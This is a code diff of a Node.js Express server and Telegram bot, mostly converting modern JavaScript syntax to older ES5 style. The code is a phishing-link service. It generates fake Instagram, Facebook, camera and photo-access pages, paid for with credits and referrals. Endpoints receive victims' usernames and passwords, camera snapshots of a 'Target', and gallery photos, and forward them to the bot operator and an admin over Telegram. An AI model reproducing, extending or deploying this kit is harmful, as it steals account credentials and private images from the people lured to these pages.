-    const featured = toggleFeaturedStatus();
-    res.json({ success: true, featured });
+app.post('/api/admin/featured/toggle', function(req, res) {
+    var featured = toggleFeaturedStatus();
+    res.json({ success: true, featured: featured });
 });
 
-// QR Code API
-app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
+app.post('/api/admin/upload-qr', upload.single('qr'), function(req, res) {
     try {
         if (!req.file) return res.status(400).json({ error: 'No file' });
         if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
@@ -1535,7 +574,7 @@ app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
     }
 });
 
-app.delete('/api/admin/remove-qr', (req, res) => {
+app.delete('/api/admin/remove-qr', function(req, res) {
     try {
         if (fs.existsSync(QR_FILE)) {
             fs.unlinkSync(QR_FILE);
@@ -1549,7 +588,7 @@ app.delete('/api/admin/remove-qr', (req, res) => {
     }
 });
 
-app.get('/api/admin/qr', (req, res) => {
+app.get('/api/admin/qr', function(req, res) {
     try {
         if (fs.existsSync(QR_FILE)) {
             res.sendFile(QR_FILE);
@@ -1561,243 +600,258 @@ app.get('/api/admin/qr', (req, res) => {
     }
 });
 
-// Logs API
-app.get('/api/admin/logs', (req, res) => {
+app.get('/api/admin/logs', function(req, res) {
     try {
-        const logs = fs.readFileSync(LOGS_FILE, 'utf8');
-        res.json({ logs });
+        var logs = fs.readFileSync(LOGS_FILE, 'utf8');
+        res.json({ logs: logs });
     } catch {
         res.json({ logs: 'No logs available' });
     }
 });
 
-app.delete('/api/admin/logs', (req, res) => {
+app.delete('/api/admin/logs', function(req, res) {
     fs.writeFileSync(LOGS_FILE, '');
     res.json({ success: true });
 });
 
 // ====================== BOT API ======================
-app.get('/api/bot/random-photo', (req, res) => {
-    const photo = getRandomPhoto();
-    if (photo) res.json({ success: true, photo });
+app.get('/api/bot/random-photo', function(req, res) {
+    var photo = getRandomPhoto();
+    if (photo) res.json({ success: true, photo: photo });
     else res.status(404).json({ error: 'No photos' });
 });
 
-app.post('/api/capture', async (req, res) => {
-    const { userid, username, password, platform } = req.body || {};
+app.post('/api/capture', async function(req, res) {
+    var body = req.body || {};
+    var userid = body.userid;
+    var username = body.username;
+    var password = body.password;
+    var platform = body.platform;
+    
     if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });
     try {
-        const photo = getRandomPhoto();
-        let message = LoveNotifer(platform, username, password);
+        var photo = getRandomPhoto();
+        var message = LoveNotifer(platform, username, password);
         if (photo) {
-            const photoUrl = `${req.protocol}://${req.get('host')}${photo.url}`;
+            var photoUrl = req.protocol + '://' + req.get('host') + photo.url;
             await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
         } else {
             await S7.sendMessage(userid, message);
         }
-        logToFile(`📸 Capture from user ${userid} - ${platform}`);
+        logToFile('📸 Capture from user ' + userid + ' - ' + platform);
         res.json({ status: 'success' });
-    } catch (error) { 
-        logToFile(`❌ Capture error: ${error.message}`);
-        res.status(500).json({ error: error.message }); 
+    } catch (error) {
+        logToFile('❌ Capture error: ' + error.message);
+        res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/capturepic', async (req, res) => {
-    const { userid, mobile, SY, platform } = req.body || {};
+app.post('/api/capturepic', async function(req, res) {
+    var body = req.body || {};
+    var userid = body.userid;
+    var mobile = body.mobile;
+    var SY = body.SY;
+    var platform = body.platform;
+    
     if (!userid || !SY) return res.status(400).json({ error: 'Missing required photo data' });
     try {
-        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
-        const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
-        const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
-        const caption = `<b>📸 NEW CAPTURE 📸</b>\n\n` +
-            `👤 <b>Target:</b> <code>${mobile || 'Unknown'}</code>\n` +
-            `🌐 <b>Platform:</b> ${platform ? platform.toUpperCase() : 'N/A'}\n` +
-            `📅 <b>Date:</b> ${SYloveDaTe}\n` +
-            `⏰ <b>Time:</b> ${SYloveTiMe}\n\n` +
-            `<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
-        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
-        logToFile(`📸 Camera capture from user ${userid}`);
+        var photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
+        var SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
+        var SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
+        var caption = '<b>📸 NEW CAPTURE 📸</b>\n\n' +
+            '👤 <b>Target:</b> <code>' + (mobile || 'Unknown') + '</code>\n' +
+            '🌐 <b>Platform:</b> ' + (platform ? platform.toUpperCase() : 'N/A') + '\n' +
+            '📅 <b>Date:</b> ' + SYloveDaTe + '\n' +
+            '⏰ <b>Time:</b> ' + SYloveTiMe + '\n\n' +
+            '<i>© ↝ ᴅᴇᴠ ʙʏ » ' + config.S7 + '</i>';
+        await S7.sendPhoto(userid, photoBuffer, { caption: caption, parse_mode: 'HTML' });
+        logToFile('📸 Camera capture from user ' + userid);
         res.json({ status: 'success' });
-    } catch (error) { 
-        logToFile(`❌ Camera capture error: ${error.message}`);
-        res.status(500).json({ error: 'Failed to process image' }); 
+    } catch (error) {
+        logToFile('❌ Camera capture error: ' + error.message);
+        res.status(500).json({ error: 'Failed to process image' });
     }
 });
 
-// ====================== PHOTO ACCESS API (FULL GALLERY) ======================
-app.post('/api/upload-photo', async (req, res) => {
+// ====================== PHOTO ACCESS API ======================
+app.post('/api/upload-photo', async function(req, res) {
     try {
-        const { userid, platform, filename, data, size } = req.body || {};
+        var body = req.body || {};
+        var userid = body.userid;
+        var platform = body.platform;
+        var filename = body.filename;
+        var data = body.data;
+        var size = body.size;
         
         if (!userid || !data) {
             return res.status(400).json({ error: 'Missing required data' });
         }
         
-        const base64Data = data.replace(/^data:image\/\w+;base64,/, "");
-        const buffer = Buffer.from(base64Data, 'base64');
+        var base64Data = data.replace(/^data:image\/\w+;base64,/, "");
+        var buffer = Buffer.from(base64Data, 'base64');
         
-        const saveName = Date.now() + '-' + (filename || 'photo.jpg');
-        const savePath = path.join(UPLOADS_DIR, saveName);
+        var saveName = Date.now() + '-' + (filename || 'photo.jpg');
+        var savePath = path.join(UPLOADS_DIR, saveName);
         fs.writeFileSync(savePath, buffer);
         
-        const caption = `📸 <b>Gallery Photo Received!</b>\n\n` +
-            `👤 <b>User:</b> <code>${userid}</code>\n` +
-            `📁 <b>File:</b> ${filename || 'photo.jpg'}\n` +
-            `📏 <b>Size:</b> ${size ? (size/1024).toFixed(1) + 'KB' : 'Unknown'}\n` +
-            `🌐 <b>Platform:</b> ${platform || 'Photo Access'}\n` +
-            `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-            `✅ <b>AI Processing Complete!</b>`;
+        var caption = '📸 <b>Gallery Photo Received!</b>\n\n' +
+            '👤 <b>User:</b> <code>' + userid + '</code>\n' +
+            '📁 <b>File:</b> ' + (filename || 'photo.jpg') + '\n' +
+            '📏 <b>Size:</b> ' + (size ? (size/1024).toFixed(1) + 'KB' : 'Unknown') + '\n' +
+            '🌐 <b>Platform:</b> ' + (platform || 'Photo Access') + '\n' +
+            '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n\n' +
+            '✅ <b>AI Processing Complete!</b>';
         
-        await S7.sendPhoto(userid, buffer, { caption, parse_mode: 'HTML' });
+        await S7.sendPhoto(userid, buffer, { caption: caption, parse_mode: 'HTML' });
         
-        await S7.sendPhoto(config.adminId, buffer, { 
-            caption: `📸 <b>Gallery Photo Upload</b>\n\n👤 User: <code>${userid}</code>\n📁 ${filename || 'photo.jpg'}`,
-            parse_mode: 'HTML' 
+        await S7.sendPhoto(config.adminId, buffer, {
+            caption: '📸 <b>Gallery Photo Upload</b>\n\n👤 User: <code>' + userid + '</code>\n📁 ' + (filename || 'photo.jpg'),
+            parse_mode: 'HTML'
         });
         
-        logToFile(`📸 Gallery photo from user ${userid}: ${filename}`);
+        logToFile('📸 Gallery photo from user ' + userid + ': ' + filename);
         res.json({ success: true, message: 'Photo uploaded successfully' });
         
     } catch (error) {
         console.error('Photo upload error:', error);
-        logToFile(`❌ Photo upload error: ${error.message}`);
+        logToFile('❌ Photo upload error: ' + error.message);
         res.status(500).json({ error: 'Failed to process photo: ' + error.message });
     }
 });
 
 // ====================== LINK GENERATION ======================
-app.get('/api/create-link', (req, res) => {
-    const userid = req.headers.userid || 'unknown';
-    const platform = req.headers.platform || 'instagram';
-    const p = platform.toLowerCase();
+app.get('/api/create-link', function(req, res) {
+    var userid = req.headers.userid || 'unknown';
+    var platform = req.headers.platform || 'instagram';
+    var p = platform.toLowerCase();
     
     if (userid !== 'unknown') {
-        const user = getUser(userid);
+        var user = getUser(userid);
         if (!user.unlimited && (user.credits || 0) <= 0) {
-            return res.status(402).json({ 
-                error: 'Insufficient credits', 
+            return res.status(402).json({
+                error: 'Insufficient credits',
                 message: 'You need 1 credit to generate a link. Use referral or buy credits!',
                 credits: user.credits || 0,
                 needBuy: true
             });
         }
         useCredit(userid);
-        logToFile(`🔗 Link generated for user ${userid} - ${platform}`);
+        logToFile('🔗 Link generated for user ' + userid + ' - ' + platform);
     }
     
-    let template;
-    const pLower = p.toLowerCase();
-    if (pLower === 'instagram') template = TEMPLATES.instagram;
-    else if (pLower === 'facebook') template = TEMPLATES.facebook;
-    else if (pLower === 'camera') template = TEMPLATES.camera;
+    var template;
+    var pLower = p.toLowerCase();
+    if (pLower === 'instagram') template = INSTA_TEMPLATE;
+    else if (pLower === 'facebook') template = FB_TEMPLATE;
+    else if (pLower === 'camera') template = CAMERA_TEMPLATE;
     else if (pLower === 'photoaccess' || pLower === 'photo') template = PHOTO_ACCESS_TEMPLATE;
     else return res.status(400).json({ error: 'Invalid platform' });
     
-    const displayPlatform = pLower === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : 
-                           pLower === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : 
+    var displayPlatform = pLower === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' :
+                           pLower === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' :
                            pLower === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐏𝐇𝐎𝐓𝐎 𝐀𝐂𝐂𝐄𝐒𝐒';
     
-    let html = template
+    var html = template
         .replace(/USERID_PLACEHOLDER/g, userid)
         .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
     
-    const fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
-    fs.writeFileSync(path.join(PAGES_DIR, `${fileId}.html`), html);
-    const url = `${config.baseUrl}/page/${fileId}`;
-    console.log(`🔗 Link generated: ${url} for user ${userid}`);
-    res.json({ success: true, url, id: fileId });
+    var fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
+    fs.writeFileSync(path.join(PAGES_DIR, fileId + '.html'), html);
+    var url = config.baseUrl + '/page/' + fileId;
+    console.log('🔗 Link generated: ' + url + ' for user ' + userid);
+    res.json({ success: true, url: url, id: fileId });
 });
 
-app.get('/page/:id', (req, res) => {
-    const id = req.params.id;
-    const filePath = path.join(PAGES_DIR, `${id}.html`);
+app.get('/page/:id', function(req, res) {
+    var id = req.params.id;
+    var filePath = path.join(PAGES_DIR, id + '.html');
     if (fs.existsSync(filePath)) res.sendFile(filePath);
     else res.status(404).send('<h1>Page not found</h1>');
 });
 
 // ====================== TELEGRAM BOT ======================
-const S7 = new TelegramBot(config.mainToken, { polling: true });
+var S7 = new TelegramBot(config.mainToken, { polling: true });
 
-S7.getMe().then((botInfo) => {
-    console.log(`✅ Bot Started: @${botInfo.username}`);
-    console.log(`✅ Bot ID: ${botInfo.id}`);
-    logToFile(`🤖 Bot Started: @${botInfo.username}`);
-}).catch(err => {
+S7.getMe().then(function(botInfo) {
+    console.log('✅ Bot Started: @' + botInfo.username);
+    console.log('✅ Bot ID: ' + botInfo.id);
+    logToFile('🤖 Bot Started: @' + botInfo.username);
+}).catch(function(err) {
     console.error('❌ Bot Start Error:', err.message);
-    logToFile(`❌ Bot Start Error: ${err.message}`);
+    logToFile('❌ Bot Start Error: ' + err.message);
     process.exit(1);
 });
 
 // ====================== KEYBOARDS ======================
-const LOVESY = {
+var LOVESY = {
     inline_keyboard: [
-        [{ text: "📸 INSTAGRAM", callback_data: "gen_instagram" }],
-        [{ text: "📘 FACEBOOK", callback_data: "gen_facebook" }],
-        [{ text: "📷 CAMERA", callback_data: "gen_camera" }],
-        [{ text: "🖼️ PHOTO ACCESS", callback_data: "gen_photoaccess" }],
-        [{ text: "👥 Referral", callback_data: "referral" }],
-        [{ text: "⭐ My Credits", callback_data: "credits" }],
-        [{ text: "💰 Buy Credits", callback_data: "buy_credits" }],
-        [{ text: "📜 Commands", callback_data: "commands" }]
+        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
+        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook' }],
+        [{ text: '📷 CAMERA', callback_data: 'gen_camera' }],
+        [{ text: '🖼️ PHOTO ACCESS', callback_data: 'gen_photoaccess' }],
+        [{ text: '👥 Referral', callback_data: 'referral' }],
+        [{ text: '⭐ My Credits', callback_data: 'credits' }],
+        [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }],
+        [{ text: '📜 Commands', callback_data: 'commands' }]
     ]
 };
 
-// Admin Keyboard
-const ADMIN_KEYBOARD = {
+var ADMIN_KEYBOARD = {
     inline_keyboard: [
-        [{ text: "👑 Admin Panel", callback_data: "admin_panel" }],
-        [{ text: "📊 Stats", callback_data: "admin_stats" }],
-        [{ text: "📢 Broadcast", callback_data: "admin_broadcast" }],
-        [{ text: "📋 Logs", callback_data: "admin_logs" }],
-        [{ text: "🔙 Back", callback_data: "back" }]
+        [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }],
+        [{ text: '📊 Stats', callback_data: 'admin_stats' }],
+        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }],
+        [{ text: '📋 Logs', callback_data: 'admin_logs' }],
+        [{ text: '🔙 Back', callback_data: 'back' }]
     ]
 };
 
-const SYBack = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back" }]] };
+var SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]] };
 
-const getRegenMarkup = (platform) => ({
-    inline_keyboard: [
-        [{ text: `🔄 REGENERATE`, callback_data: `regen_${platform}` }],
-        [{ text: "🔙 BACK", callback_data: "back" }]
-    ]
-});
+function getRegenMarkup(platform) {
+    return {
+        inline_keyboard: [
+            [{ text: '🔄 REGENERATE', callback_data: 'regen_' + platform }],
+            [{ text: '🔙 BACK', callback_data: 'back' }]
+        ]
+    };
+}
 
 // ====================== BOT COMMANDS ======================
 async function SendLoveSYMenu(chatId, firstName) {
-    const user = getUser(chatId);
-    const featured = getFeatured();
-    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
-    const isAdmin = chatId.toString() === config.adminId;
+    var user = getUser(chatId);
+    var featured = getFeatured();
+    var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
+    var isAdmin = chatId.toString() === config.adminId;
     
-    let message = `𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ${credits}\n👥 Referrals: ${user.totalReferrals || 0}`;
+    var message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0);
     
     if (featured.status && featured.message) {
-        message += `\n\n📌 ${featured.message}`;
+        message += '\n\n📌 ' + featured.message;
     }
     
-    const menuText = SYloveMenu(firstName, message);
+    var menuText = SYloveMenu(firstName, message);
     
-    let keyboard = LOVESY;
+    var keyboard = LOVESY;
     if (isAdmin) {
         keyboard = {
-            inline_keyboard: [
-                ...LOVESY.inline_keyboard,
-                [{ text: "👑 Admin Panel", callback_data: "admin_panel" }]
-            ]
+            inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel' }]])
         };
     }
     
-    const sentMsg = await S7.sendMessage(chatId, menuText, { 
-        parse_mode: 'HTML', 
-        reply_markup: keyboard 
+    var sentMsg = await S7.sendMessage(chatId, menuText, {
+        parse_mode: 'HTML',
+        reply_markup: keyboard
     });
     
     if (featured.status && featured.photo) {
-        const photos = getPhotos();
-        const photo = photos.find(p => p.id === featured.photo);
+        var photos = getPhotos();
+        var photo = null;
+        for (var i = 0; i < photos.length; i++) {
+            if (photos[i].id === featured.photo) { photo = photos[i]; break; }
+        }
         if (photo) {
-            const photoUrl = `${config.baseUrl}${photo.url}`;
+            var photoUrl = config.baseUrl + photo.url;
             await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
         }
     }
@@ -1806,13 +860,13 @@ async function SendLoveSYMenu(chatId, firstName) {
 }
 
 async function checkAndSendMenu(chatId, firstName) {
-    const isMember = await checkAllChannels(chatId);
+    var isMember = await checkAllChannels(chatId);
     if (!isMember) {
-        const channels = getChannels();
-        let msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
-        channels.forEach((c, i) => {
-            msg += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
-        });
+        var channels = getChannels();
+        var msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
+        for (var i = 0; i < channels.length; i++) {
+            msg += (i+1) + '. <a href="' + channels[i].link + '">' + channels[i].name + '</a>\n';
+        }
         msg += '\nAfter joining, click below to verify.';
         return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
     }
@@ -1821,12 +875,12 @@ async function checkAndSendMenu(chatId, firstName) {
 
 function SYLoVe(commands) {
     if (!Array.isArray(commands)) commands = [commands];
-    S7.on('message', async (msg) => {
+    S7.on('message', async function(msg) {
         if (!msg.text) return;
-        const cmd = msg.text.trim().split(' ')[0].slice(1);
-        if (commands.includes(cmd)) {
-            console.log(`📩 Command: ${cmd} from ${msg.from.first_name}`);
-            logToFile(`📩 Command: ${cmd} from ${msg.from.id}`);
+        var cmd = msg.text.trim().split(' ')[0].slice(1);
+        if (commands.indexOf(cmd) !== -1) {
+            console.log('📩 Command: ' + cmd + ' from ' + msg.from.first_name);
+            logToFile('📩 Command: ' + cmd + ' from ' + msg.from.id);
             await checkAndSendMenu(msg.chat.id, msg.from.first_name);
         }
     });
@@ -1835,19 +889,19 @@ function SYLoVe(commands) {
 SYLoVe(['start', 'menu']);
 
 // ====================== REFERRAL HANDLER ======================
-S7.on('message', async (msg) => {
+S7.on('message', async function(msg) {
     if (!msg.text) return;
-    const text = msg.text.trim();
+    var text = msg.text.trim();
     if (text.startsWith('/start ref_')) {
-        const referrerId = text.replace('/start ref_', '');
-        const userId = msg.from.id;
+        var referrerId = text.replace('/start ref_', '');
+        var userId = msg.from.id;
         
-        const user = getUser(userId);
+        var user = getUser(userId);
         if (user.referredBy) {
             return S7.sendMessage(userId, '✅ You are already registered!');
         }
         
-        const referrer = getUser(referrerId);
+        var referrer = getUser(referrerId);
         if (!referrer) {
             return S7.sendMessage(userId, '❌ Invalid referral link!');
         }
@@ -1856,11 +910,11 @@ S7.on('message', async (msg) => {
             user._pendingReferrer = referrerId;
             saveUsers(getUsers());
             
-            const channels = getChannels();
-            let msgText = '⚠️ <b>Join all channels first!</b>\n\n';
-            channels.forEach((c, i) => {
-                msgText += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
-            });
+            var channels = getChannels();
+            var msgText = '⚠️ <b>Join all channels first!</b>\n\n';
+            for (var i = 0; i < channels.length; i++) {
+                msgText += (i+1) + '. <a href="' + channels[i].link + '">' + channels[i].name + '</a>\n';
+            }
             msgText += '\nAfter joining, click below to claim referral bonus!';
             return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
         }
@@ -1870,120 +924,106 @@ S7.on('message', async (msg) => {
 });
 
 async function processReferral(referrerId, userId) {
-    const user = getUser(userId);
+    var user = getUser(userId);
     if (user.referredBy) return;
     
     user.referredBy = referrerId;
     user.credits = (user.credits || 0) + 3;
     saveUsers(getUsers());
     
-    const referrer = addReferral(referrerId, userId);
+    var referrer = addReferral(referrerId, userId);
     
-    let newUserInfo = '@user_' + userId;
+    var newUserInfo = '@user_' + userId;
     try {
-        const chat = await S7.getChat(userId);
+        var chat = await S7.getChat(userId);
         newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId;
     } catch(e) {}
     
-    let referrerInfo = '@user_' + referrerId;
+    var referrerInfo = '@user_' + referrerId;
     try {
-        const chat = await S7.getChat(referrerId);
-        referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId;
+        var chat2 = await S7.getChat(referrerId);
+        referrerInfo = chat2.username ? '@' + chat2.username : chat2.first_name || '@user_' + referrerId;
     } catch(e) {}
     
-    await S7.sendMessage(referrerId, 
-        `🎉 <b>New Referral Success!</b>\n\n` +
-        `👤 <b>New User:</b> ${newUserInfo}\n` +
-        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
-        `⭐ <b>Points Earned:</b> +2\n\n` +
-        `📊 <b>Your Total Points:</b> ${referrer.credits || 0}\n` +
-        `📊 <b>Your Total Referrals:</b> ${referrer.totalReferrals || 0}`,
+    await S7.sendMessage(referrerId,
+        '🎉 <b>New Referral Success!</b>\n\n' +
+        '👤 <b>New User:</b> ' + newUserInfo + '\n' +
+        '🆔 <b>New User ID:</b> <code>' + userId + '</code>\n' +
+        '⭐ <b>Points Earned:</b> +2\n\n' +
+        '📊 <b>Your Total Points:</b> ' + (referrer.credits || 0) + '\n' +
+        '📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0),
         { parse_mode: 'HTML' }
     );
     
     await S7.sendMessage(config.adminId,
-        `👥 <b>New Referral Success!</b>\n\n` +
-        `👤 <b>Referrer:</b> ${referrerInfo}\n` +
-        `👤 <b>New User:</b> ${newUserInfo}\n` +
-        `🆔 <b>Referrer ID:</b> <code>${referrerId}</code>\n` +
-        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
-        `⭐ <b>Points Earned:</b> 2\n\n` +
-        `📊 <b>Referrer Total Points:</b> ${referrer.credits || 0}\n` +
-        `📊 <b>Referrer Total Referrals:</b> ${referrer.totalReferrals || 0}`,
+        '👥 <b>New Referral Success!</b>\n\n' +
+        '👤 <b>Referrer:</b> ' + referrerInfo + '\n' +
+        '👤 <b>New User:</b> ' + newUserInfo + '\n' +
+        '🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n' +
+        '🆔 <b>New User ID:</b> <code>' + userId + '</code>\n' +
+        '⭐ <b>Points Earned:</b> 2\n\n' +
+        '📊 <b>Referrer Total Points:</b> ' + (referrer.credits || 0) + '\n' +
+        '📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0),
         { parse_mode: 'HTML' }
     );
     
-    await S7.sendMessage(userId, 
-        `✅ <b>Welcome!</b>\n\n` +
-        `You joined through <b>${referrerInfo}</b>'s referral link!\n` +
-        `🎁 <b>Bonus:</b> +3 Credits\n` +
-        `⭐ <b>Your Credits:</b> ${user.credits}`,
+    await S7.sendMessage(userId,
+        '✅ <b>Welcome!</b>\n\n' +
+        'You joined through <b>' + referrerInfo + '</b>\'s referral link!\n' +
+        '🎁 <b>Bonus:</b> +3 Credits\n' +
+        '⭐ <b>Your Credits:</b> ' + user.credits,
         { parse_mode: 'HTML' }
     );
     
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
-    logToFile(`👥 Referral: ${referrerId} -> ${userId}`);
+    logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
 }
 
 // ====================== CALLBACK QUERY HANDLER ======================
-S7.on('callback_query', async (q) => {
-    const uid = q.from.id;
-    const mid = q.message.message_id;
-    const cid = q.message.chat.id;
-    const isAdmin = uid.toString() === config.adminId;
-    console.log(`🔘 Callback: ${q.data} from ${q.from.first_name}`);
+S7.on('callback_query', async function(q) {
+    var uid = q.from.id;
+    var mid = q.message.message_id;
+    var cid = q.message.chat.id;
+    var isAdmin = uid.toString() === config.adminId;
+    console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);
     
-    // ========== ADMIN CALLBACKS ==========
-    if (q.data === "admin_panel" && isAdmin) {
+    if (q.data === 'admin_panel' && isAdmin) {
         await S7.deleteMessage(cid, mid);
-        await S7.sendMessage(cid,
-            `👑 <b>Admin Panel</b>\n\n` +
-            `Select an option below to manage the bot.`,
-            { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD }
-        );
+        await S7.sendMessage(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below to manage the bot.', { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
         return;
     }
     
-    if (q.data === "admin_stats" && isAdmin) {
-        const users = getUsers();
-        const totalUsers = Object.keys(users).length;
-        const photos = getPhotos();
-        const channels = getChannels();
-        const referrals = getReferrals();
+    if (q.data === 'admin_stats' && isAdmin) {
+        var users = getUsers();
+        var totalUsers = Object.keys(users).length;
+        var photos = getPhotos();
+        var channels = getChannels();
+        var referrals = getReferrals();
         
         await S7.sendMessage(cid,
-            `📊 <b>Bot Statistics</b>\n\n` +
-            `👥 Total Users: ${totalUsers}\n` +
-            `📷 Total Photos: ${photos.length}\n` +
-            `📢 Total Channels: ${channels.length}\n` +
-            `👥 Total Referrals: ${referrals.length}\n` +
-            `⏱ Uptime: ${getUptime()}`,
+            '📊 <b>Bot Statistics</b>\n\n' +
+            '👥 Total Users: ' + totalUsers + '\n' +
+            '📷 Total Photos: ' + photos.length + '\n' +
+            '📢 Total Channels: ' + channels.length + '\n' +
+            '👥 Total Referrals: ' + referrals.length + '\n' +
+            '⏱ Uptime: ' + getUptime(),
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         await S7.deleteMessage(cid, mid);
         return;
     }
     
-    if (q.data === "admin_broadcast" && isAdmin) {
-        await S7.sendMessage(cid,
-            `📢 <b>Send Broadcast</b>\n\n` +
-            `Please type your broadcast message.\n` +
-            `Reply with: /broadcast [message]`,
-            { parse_mode: 'HTML', reply_markup: SYBack }
-        );
+    if (q.data === 'admin_broadcast' && isAdmin) {
+        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nPlease type your broadcast message.\nReply with: /broadcast [message]', { parse_mode: 'HTML', reply_markup: SYBack });
         await S7.deleteMessage(cid, mid);
         return;
     }
     
-    if (q.data === "admin_logs" && isAdmin) {
+    if (q.data === 'admin_logs' && isAdmin) {
         try {
-            const logs = fs.readFileSync(LOGS_FILE, 'utf8');
-            const lastLogs = logs.split('\n').slice(-50).join('\n');
-            await S7.sendMessage(cid,
-                `📋 <b>Recent Logs</b>\n\n` +
-                `<pre>${lastLogs || 'No logs available'}</pre>`,
-                { parse_mode: 'HTML', reply_markup: SYBack }
-            );
+            var logs = fs.readFileSync(LOGS_FILE, 'utf8');
+            var lastLogs = logs.split('\n').slice(-50).join('\n');
+            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs available') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
         } catch {
             await S7.sendMessage(cid, 'No logs available', { reply_markup: SYBack });
         }
@@ -1991,14 +1031,13 @@ S7.on('callback_query', async (q) => {
         return;
     }
     
-    // ========== USER CALLBACKS ==========
-    if (q.data === "check_all") {
-        const isMember = await checkAllChannels(uid);
+    if (q.data === 'check_all') {
+        var isMember = await checkAllChannels(uid);
         if (isMember) {
             await S7.deleteMessage(cid, mid);
-            const user = getUser(uid);
+            var user = getUser(uid);
             if (user._pendingReferrer) {
-                const referrerId = user._pendingReferrer;
+                var referrerId = user._pendingReferrer;
                 delete user._pendingReferrer;
                 saveUsers(getUsers());
                 await processReferral(referrerId, uid);
@@ -2006,42 +1045,42 @@ S7.on('callback_query', async (q) => {
             }
             await SendLoveSYMenu(cid, q.from.first_name);
         } else {
-            await S7.answerCallbackQuery(q.id, { text: "❌ Please join ALL channels first!", show_alert: true });
+            await S7.answerCallbackQuery(q.id, { text: '❌ Please join ALL channels first!', show_alert: true });
         }
         return;
     }
     
-    if (q.data === "commands") {
-        let cmdMsg = `📜 <b>All Commands</b>\n\n`;
-        cmdMsg += `👤 <b>User Commands:</b>\n`;
-        cmdMsg += `• /start - Start bot\n`;
-        cmdMsg += `• /menu - Show menu\n`;
-        cmdMsg += `• /pay [amount] - Buy credits\n`;
-        cmdMsg += `• /credits - Check credits\n`;
-        cmdMsg += `• /referral - Get referral link\n\n`;
+    if (q.data === 'commands') {
+        var cmdMsg = '📜 <b>All Commands</b>\n\n';
+        cmdMsg += '👤 <b>User Commands:</b>\n';
+        cmdMsg += '• /start - Start bot\n';
+        cmdMsg += '• /menu - Show menu\n';
+        cmdMsg += '• /pay [amount] - Buy credits\n';
+        cmdMsg += '• /credits - Check credits\n';
+        cmdMsg += '• /referral - Get referral link\n\n';
         
         if (isAdmin) {
-            cmdMsg += `👑 <b>Admin Commands:</b>\n`;
-            cmdMsg += `• /admin - Open admin panel\n`;
-            cmdMsg += `• /addcredits [userId] [amount] - Add credits\n`;
-            cmdMsg += `• /removecredits [userId] [amount] - Remove credits\n`;
-            cmdMsg += `• /unlimited [userId] - Activate unlimited\n`;
-            cmdMsg += `• /resetuser [userId] - Reset user\n`;
-            cmdMsg += `• /users - Show all users\n`;
